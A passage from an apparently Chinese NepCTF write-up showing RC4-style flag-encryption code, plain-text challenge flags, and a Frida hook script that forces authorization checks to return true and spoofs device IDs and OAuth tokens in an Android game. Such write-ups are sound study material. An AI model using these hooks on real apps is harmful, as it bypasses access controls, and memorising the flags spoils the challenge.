list(range(MOD))  # [0,1,2, ... , 255]</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(MOD):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % MOD</span><br><span class="line">        S[i], S[j] = S[j], S[i]  # swap values</span><br><span class="line"></span><br><span class="line">    return S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def PRGA(S):</span><br><span class="line">    i = 0</span><br><span class="line">    j = 0</span><br><span class="line">    whileTrue:</span><br><span class="line">        i = (i + 1) % MOD</span><br><span class="line">        j = (j + S[i]) % MOD</span><br><span class="line"></span><br><span class="line">        S[i], S[j] = S[j], S[i]  # swap values</span><br><span class="line">        K = S[(S[i] + S[j]) % MOD]</span><br><span class="line">        yield K</span><br><span class="line"></span><br><span class="line">KEY = b&quot;Speedmino Created By MrZ and modified by zxc&quot;</span><br><span class="line">Sbox = KSA(KEY)</span><br><span class="line">Stream = PRGA(Sbox)</span><br><span class="line">def encrypt1(plain):</span><br><span class="line">    encrypted = bytearray(plain)</span><br><span class="line">    for i in range(len(encrypted)):</span><br><span class="line">        encrypted[i] = (encrypted[i] + next(Stream)) % 256</span><br><span class="line">    return encrypted</span><br><span class="line"></span><br><span class="line">def decrypt1(plain):</span><br><span class="line">    encrypted = bytearray(plain)</span><br><span class="line">    for i in range(len(encrypted)):</span><br><span class="line">        encrypted[i] = (encrypted[i] - next(Stream)) % 256</span><br><span class="line">    return encrypted</span><br><span class="line"># FLAG = b&quot;FAKE&#123;D0_You_F1nd_A_DLL_1s_5tran9e?!Challenge_Starts!!!&#125;&quot;</span><br><span class="line">FLAG = b&quot;NepCTF&#123;Y0u_c4n_M0dDing_LOVE2D_g@mE_By_l0vely_iNjector!&#125;&quot;</span><br><span class="line">result = encrypt1(FLAG)</span><br><span class="line">for i in range(len(result)):</span><br><span class="line">    print(result[i],end=&#x27;,&#x27;)</span><br><span class="line"></span><br><span class="line"># ========================================</span><br><span class="line"></span><br><span class="line"># FLAG = b&quot;NepCTF&#123;You_ARE_SpeedMino_GRAND-MASTER_ROUNDS!_TGLKZ&#125;&quot;</span><br><span class="line"># result = FLAG</span><br><span class="line"># for i in range(2600):</span><br><span class="line">#     result = decrypt1(result)</span><br><span class="line"></span><br><span class="line"># for i in range(len(result)):</span><br><span class="line">#     print(result[i],end=&#x27;,&#x27;)</span><br></pre></td></tr></table></figure></div>

<h2 id="XSafe"><a href="#XSafe" class="headerlink" title="XSafe"></a><strong>XSafe</strong></h2><p>零解题，明年见</p>
<h1 id="RW"><a href="#RW" class="headerlink" title="RW"></a><strong>RW</strong></h1><h2 id="PopTower"><a href="#PopTower" class="headerlink" title="PopTower"></a><strong>PopTower</strong></h2><p>仅提供脚本，具体思路建议实操体会</p>
<p>Apk 重新打包签名，missingAssets 放到 assets\graphics\ missingSound 放到 assets\sound\bejeweled\</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgiciaHEZR6JOnF0icWMuEAs9qKQbf0C9G0Kq7wwqMInQOV5L0NAYdTUy6A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgWoasy6tBULhvIRz1gCX0c8icNL6OoWNuPPibc9zrryz0jYQJCibS250uA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1"
                      alt="图片"
                ></p>
<p>基于FridaContainer 项目 typescript</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br></pre></td><td class="code"><pre><span class="line">import &#123;FCAnd&#125; from&quot;./utils/FCAnd&quot;</span><br><span class="line"></span><br><span class="line">function java_hook()&#123;</span><br><span class="line">    console.log(&quot;Java Hooking&quot;)</span><br><span class="line"></span><br><span class="line">    let WebViewClientBase = Java.use(&quot;net.gree.asdk.core.ui.web.WebViewClientBase&quot;);</span><br><span class="line">    WebViewClientBase[&quot;getBacktoUrl&quot;].implementation = function (view, baseUrl) &#123;</span><br><span class="line">        console.log(`WebViewClientBase.getBacktoUrl is called: view=$&#123;view&#125;, baseUrl=$&#123;baseUrl&#125;`);</span><br><span class="line">        let result = this[&quot;getBacktoUrl&quot;](view, baseUrl);</span><br><span class="line">        console.log(`WebViewClientBase.getBacktoUrl result=$&#123;result&#125;`);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let LogLevel = Java.use(&quot;net.gree.asdk.core.GLog$LogLevel&quot;);</span><br><span class="line">    LogLevel[&quot;getCode&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`LogLevel.getCode is called`);</span><br><span class="line">        let result = this[&quot;getCode&quot;]();</span><br><span class="line">        return100;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let DeviceInfo = Java.use(&quot;net.gree.asdk.core.util.DeviceInfo&quot;);</span><br><span class="line">    DeviceInfo[&quot;updateUuid&quot;].implementation = function (listener) &#123;</span><br><span class="line">        console.log(`DeviceInfo.updateUuid is called: listener=$&#123;listener&#125;`);</span><br><span class="line">        this[&quot;updateUuid&quot;](listener);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // let DeviceInfo = Java.use(&quot;net.gree.asdk.core.util.DeviceInfo&quot;);</span><br><span class="line">    DeviceInfo[&quot;getUuid&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`DeviceInfo.getUuid is called`);</span><br><span class="line">        FCAnd.showStacks();</span><br><span class="line">        let result = this[&quot;getUuid&quot;]();</span><br><span class="line">        console.log(`DeviceInfo.getUuid result=$&#123;result&#125;`);</span><br><span class="line">        return&quot;96b44bca-95a3-47d8-a5ff-84a2a4d518f4&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // let DeviceInfo = Java.use(&quot;net.gree.asdk.core.util.DeviceInfo&quot;);</span><br><span class="line">    DeviceInfo[&quot;isDevelop&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`DeviceInfo.isDevelop is called`);</span><br><span class="line">        let result = this[&quot;isDevelop&quot;]();</span><br><span class="line">        console.log(`DeviceInfo.isDevelop result=$&#123;result&#125;`);</span><br><span class="line">        returntrue;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // let DeviceInfo = Java.use(&quot;net.gree.asdk.core.util.DeviceInfo&quot;);</span><br><span class="line">    DeviceInfo[&quot;getUdid&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`DeviceInfo.getUdid is called`);</span><br><span class="line">        let result = this[&quot;getUdid&quot;]();</span><br><span class="line">        console.log(`DeviceInfo.getUdid result=$&#123;result&#125;`);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let App = Java.use(&quot;jp.co.taito.am.gree.poptower.App&quot;);</span><br><span class="line">    App[&quot;isAuth&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`App.isAuth is called`);</span><br><span class="line">        FCAnd.showStacks();</span><br><span class="line">        let result = this[&quot;isAuth&quot;]();</span><br><span class="line">        console.log(`App.isAuth result=$&#123;result&#125;`);</span><br><span class="line">        returntrue;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let Util = Java.use(&quot;jp.co.taito.am.gree.poptower.Util&quot;);</span><br><span class="line">    Util[&quot;isAuthorized&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`Util.isAuthorized is called`);</span><br><span class="line">        let result = this[&quot;isAuthorized&quot;]();</span><br><span class="line">        console.log(`Util.isAuthorized result=$&#123;result&#125;`);</span><br><span class="line">        returntrue;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Util[&quot;getGreeUserParameter&quot;].implementation = function () &#123;</span><br><span class="line">        // console.log(`Util.getGreeUserParameter is called`);</span><br><span class="line">        // FCAnd.showStacks();</span><br><span class="line">        // let result = this[&quot;getGreeUserParameter&quot;]();</span><br><span class="line">        // console.log(`Util.getGreeUserParameter result=$&#123;result&#125;`);</span><br><span class="line">        let result = [&quot;opensocial_owner_id=&quot; + &quot;NeuroSama&quot;, &quot;oauth_token=&quot; + &quot;11111111&quot;, &quot;oauth_token_secret=&quot; + &quot;00000000&quot;];</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let GreeUser = Java.use(&quot;net.gree.asdk.api.GreeUser&quot;);</span><br><span class="line">    GreeUser[&quot;getId&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`GreeUser.getId is called`);</span><br><span class="line">        let result = this[&quot;getId&quot;]();</span><br><span class="line">        console.log(`GreeUser.getId result=$&#123;result&#125;`);</span><br><span class="line">        return&quot;NeuroSama&quot;;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let ItemSelect = Java.use(&quot;jp.co.taito.am.gree.poptower.ItemSelect&quot;);</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;ResourceCheckInit&quot;].implementation = function () &#123;</span><br><span class="line">        // is_Mode = 41</span><br><span class="line">        console.log(`ItemSelect.ResourceCheckInit is called`);</span><br><span class="line">        this[&quot;ResourceCheckInit&quot;]();</span><br><span class="line">        this.is_Mode.value = 0;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;InitAccessCtrl&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.InitAccessCtrl is called`);</span><br><span class="line">        let data = &quot;10&quot;</span><br><span class="line">        this.GetFirstData(data, data.length);</span><br><span class="line">        this.TowerName.value = &quot;ビジュエルドタワー&quot;;</span><br><span class="line">        this.TowerType.value = 10;</span><br><span class="line">        this.FloorName.value = &quot;Neuro&quot;</span><br><span class="line">        this.TicketName.value = &quot;サービスチケット&quot;</span><br><span class="line">        this.loadSound(10, &quot;game_music.ogg&quot;);</span><br><span class="line">        this.is_Mode.value = 8;</span><br><span class="line">        console.log(`ItemSelect.InitAccessCtrl is End`);</span><br><span class="line">        this.IniItemMax();</span><br><span class="line">        this.GetManualDetaRead();</span><br><span class="line">        this.GetMymonItemRead();</span><br><span class="line">        this.GetItemDetailRead();</span><br><span class="line">        this.SetSelectItemID(0,11329)</span><br><span class="line">        this.SetSelectItemID(1,13339)</span><br><span class="line">        this.SetSelectItemID(2,13429)</span><br><span class="line">        this.SetSelectItemID(3,13519)</span><br><span class="line">        this.SetSelectItemID(4,13709)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let Sound = Java.use(&quot;jp.co.taito.am.gree.poptower.Sound&quot;);</span><br><span class="line">    Sound[&quot;init&quot;].implementation = function (loadItemBgmNames, loadGameBgmNames, defaultBgmName, loadItemSeNames, loadGameSeNames) &#123;</span><br><span class="line">        console.log(`Sound.init is called: loadItemBgmNames=$&#123;loadItemBgmNames&#125;, loadGameBgmNames=$&#123;loadGameBgmNames&#125;, defaultBgmName=$&#123;defaultBgmName&#125;, loadItemSeNames=$&#123;loadItemSeNames&#125;, loadGameSeNames=$&#123;loadGameSeNames&#125;`);</span><br><span class="line">        let Sound = Java.use(&quot;jp.co.taito.am.gree.poptower.Sound&quot;);</span><br><span class="line">        Sound[&quot;setBgmVolume&quot;].implementation = function (vol) &#123;</span><br><span class="line">            console.log(`Sound.setBgmVolume is called: vol=$&#123;vol&#125;`);</span><br><span class="line">            this[&quot;setBgmVolume&quot;](1.0);</span><br><span class="line">        &#125;;</span><br><span class="line">        Sound[&quot;setSeVolume&quot;].implementation = function (vol) &#123;</span><br><span class="line">            console.log(`Sound.setSeVolume is called: vol=$&#123;vol&#125;`);</span><br><span class="line">            this[&quot;setSeVolume&quot;](1.0);</span><br><span class="line">        &#125;;</span><br><span class="line">        let result = this[&quot;init&quot;](loadItemBgmNames, loadGameBgmNames, &quot;menu_music.ogg&quot;, loadItemSeNames, loadGameSeNames);</span><br><span class="line">        console.log(`Sound.init result=$&#123;result&#125;`);</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    let ResourceLoader = Java.use(&quot;jp.co.taito.am.gree.poptower.ResourceLoader&quot;);</span><br><span class="line">    ResourceLoader[&quot;createMediaPlayer&quot;].implementation = function (filename) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            console.log(`ResourceLoader.createMediaPlayer is called: filename=$&#123;filename&#125;`);</span><br><span class="line">            let result = this.createMediaPlayerFromAssets(filename)</span><br><span class="line">            console.log(&quot;Hook createMediaPlayer end&quot;);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;catch(e)&#123;</span><br><span class="line">            console.log(&quot;createMediaPlayer&quot;,e)</span><br><span class="line">        &#125;</span><br><span class="line">        returnnull;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // let App = Java.use(&quot;jp.co.taito.am.gree.poptower.App&quot;);</span><br><span class="line">    App[&quot;getNickNameSts&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`App.getNickNameSts is called`);</span><br><span class="line">        let result = this[&quot;getNickNameSts&quot;]();</span><br><span class="line">        console.log(`App.getNickNameSts result=$&#123;result&#125;`);</span><br><span class="line">        return1;</span><br><span class="line">    &#125;;</span><br><span class="line">    // let ItemSelect = Java.use(&quot;jp.co.taito.am.gree.poptower.ItemSelect&quot;);</span><br><span class="line">    ItemSelect[&quot;WelcomeSet&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.WelcomeSet is called`);</span><br><span class="line">        let result = this[&quot;WelcomeSet&quot;]();</span><br><span class="line">        console.log(`ItemSelect.WelcomeSet result=$&#123;result&#125;`);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let GameView = Java.use(&quot;jp.co.taito.am.gree.poptower.GameView&quot;);</span><br><span class="line">    let MissingFile = [</span><br><span class="line">        &quot;bej_gems.png&quot;,</span><br><span class="line">        &quot;bej_ef_flame.png&quot;,</span><br><span class="line">        &quot;bej_field_score.png&quot;,</span><br><span class="line">        &quot;bej_go.png&quot;,</span><br><span class="line">        &quot;bej_time_up.png&quot;,</span><br><span class="line">        &quot;bej_clear.png&quot;,</span><br><span class="line">        &quot;bej_good.png&quot;,</span><br><span class="line">        &quot;bej_excellent.png&quot;,</span><br><span class="line">        &quot;bej_anthem.png&quot;,</span><br><span class="line">        &quot;bej_extraordinary.png&quot;,</span><br><span class="line">        &quot;bej_unbelievable.png&quot;,</span><br><span class="line">        &quot;bej_minute.png&quot;,</span><br><span class="line">        &quot;bej_hint.png&quot;,</span><br><span class="line">        &quot;bej_hint_arrow.png&quot;,</span><br><span class="line">        &quot;bej_selector.png&quot;,</span><br><span class="line">        &quot;bej_last_bonus.png&quot;,</span><br><span class="line">        &quot;bej_ef_etc.png&quot;,</span><br><span class="line">        &quot;bej_boundary.png&quot;,</span><br><span class="line">        &quot;bej_ef_hyper.png&quot;,</span><br><span class="line">&quot;bejeweled_bg_00.jpg&quot;, &quot;bejeweled_bg_01.jpg&quot;, &quot;bejeweled_bg_02.jpg&quot;, &quot;bejeweled_bg_03.jpg&quot;, &quot;bejeweled_bg_04.jpg&quot;, &quot;bejeweled_bg_05.jpg&quot;, &quot;bejeweled_bg_06.jpg&quot;, &quot;bejeweled_bg_07.jpg&quot;, &quot;bejeweled_bg_08.jpg&quot;, &quot;bejeweled_bg_09.jpg&quot;, &quot;bejeweled_bg_10.jpg&quot;, &quot;bejeweled_bg_11.jpg&quot;, &quot;bejeweled_bg_12.jpg&quot;, &quot;bejeweled_bg_13.jpg&quot;, &quot;bejeweled_bg_14.jpg&quot;, &quot;bejeweled_bg_15.jpg&quot;, &quot;bejeweled_bg_16.jpg&quot;,</span><br><span class="line">    ]</span><br><span class="line">    GameView[&quot;createImage&quot;].overload(&#x27;java.lang.String&#x27;, &#x27;int&#x27;).implementation = function (filename, format) &#123;</span><br><span class="line">        let oriName = filename</span><br><span class="line">        // console.log(`GameView.createImage is called: filename=$&#123;filename&#125;, format=$&#123;format&#125;`);</span><br><span class="line">        console.log(filename,filename.startsWith(&quot;assets/graphics/item/&quot;))</span><br><span class="line">        if(MissingFile.indexOf(filename) &gt; -1)&#123;</span><br><span class="line">            filename = &quot;assets/graphics/missingAssets/&quot; + filename;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif(!filename.startsWith(&quot;assets/graphics/&quot;))&#123;</span><br><span class="line">            filename = &quot;assets/graphics/item/&quot; + filename;</span><br><span class="line">        &#125;</span><br><span class="line">        if(oriName != filename)&#123;</span><br><span class="line">            console.log(`replaced $&#123;filename&#125;`);</span><br><span class="line">        &#125;</span><br><span class="line">        let result = this[&quot;createImage&quot;](filename, format);</span><br><span class="line">        // console.log(`GameView.createImage result=$&#123;result&#125;`);</span><br><span class="line">        // FCAnd.showStacks();</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let AnonymousClass15 = Java.use(&quot;jp.co.taito.am.gree.poptower.App$15&quot;);</span><br><span class="line">    AnonymousClass15[&quot;onReceivedError&quot;].implementation = function (view, errorCode, description, failingUrl) &#123;</span><br><span class="line">        console.log(`AnonymousClass15.onReceivedError is called: view=$&#123;view&#125;, errorCode=$&#123;errorCode&#125;, description=$&#123;description&#125;, failingUrl=$&#123;failingUrl&#125;`);</span><br><span class="line">        FCAnd.showStacks();</span><br><span class="line">        this[&quot;onReceivedError&quot;](view, errorCode, description, failingUrl);</span><br><span class="line">    &#125;;</span><br><span class="line">    // let Util = Java.use(&quot;jp.co.taito.am.gree.poptower.Util&quot;);</span><br><span class="line">    Util[&quot;getPoptowerMypageUrl&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`Util.getPoptowerMypageUrl is called`);</span><br><span class="line">        let result = this[&quot;getPoptowerMypageUrl&quot;]();</span><br><span class="line">        console.log(`Util.getPoptowerMypageUrl result=$&#123;result&#125;`);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;PopcapLogoWait&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.PopcapLogoWait is called`);</span><br><span class="line">        this.is_Mode.value = 52;</span><br><span class="line">        // this[&quot;PopcapLogoWait&quot;]();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;InitAccessInit&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.InitAccessInit is called`);</span><br><span class="line">        this[&quot;InitAccessInit&quot;]();</span><br><span class="line">        console.log(`ItemSelect.InitAccessInit End`);</span><br><span class="line">    &#125;;</span><br><span class="line">    App[&quot;getGameID&quot;].implementation = function () &#123;</span><br><span class="line">        // console.log(`App.getGameID is called`);</span><br><span class="line">        // FCAnd.showStacks();</span><br><span class="line">        return10;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;GamePreparation&quot;].implementation = function (gameID) &#123;</span><br><span class="line">        console.log(`ItemSelect.GamePreparation is called: gameID=$&#123;gameID&#125;`);</span><br><span class="line">        gameID = 10;</span><br><span class="line">        this[&quot;GamePreparation&quot;](gameID);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;FollowAccessInit&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.FollowAccessInit is called`);</span><br><span class="line">        this.prevAppId.value = &quot;10&quot;;</span><br><span class="line">        this[&quot;FollowAccessInit&quot;]();</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ItemSelect[&quot;FollowAccessWait&quot;].implementation = function () &#123;</span><br><span class="line">        console.log(`ItemSelect.FollowAccessWait is called`);</span><br><span class="line">        // this.is_Mode.value = 11;</span><br><span class="line">        this.is_Mode.value = 8;</span><br><span class="line">        // 